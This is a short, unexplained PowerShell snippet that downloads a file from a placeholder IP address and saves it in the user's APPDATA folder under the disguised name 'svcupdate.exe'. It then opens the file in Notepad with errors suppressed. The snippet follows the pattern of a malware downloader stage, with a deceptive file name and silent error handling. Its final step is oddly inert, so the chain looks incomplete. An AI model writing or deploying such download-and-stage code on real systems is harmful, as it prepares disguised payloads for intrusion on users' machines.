$PayloadUrl = "http://198.51.100.125/update.dat"
$LocalPath = "$env:APPDATA\svcupdate.exe"
curl.exe -s -L -o $LocalPath $PayloadUrl
Start-Process -FilePath "notepad.exe" -ArgumentList $LocalPath -ErrorAction SilentlyContinue
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
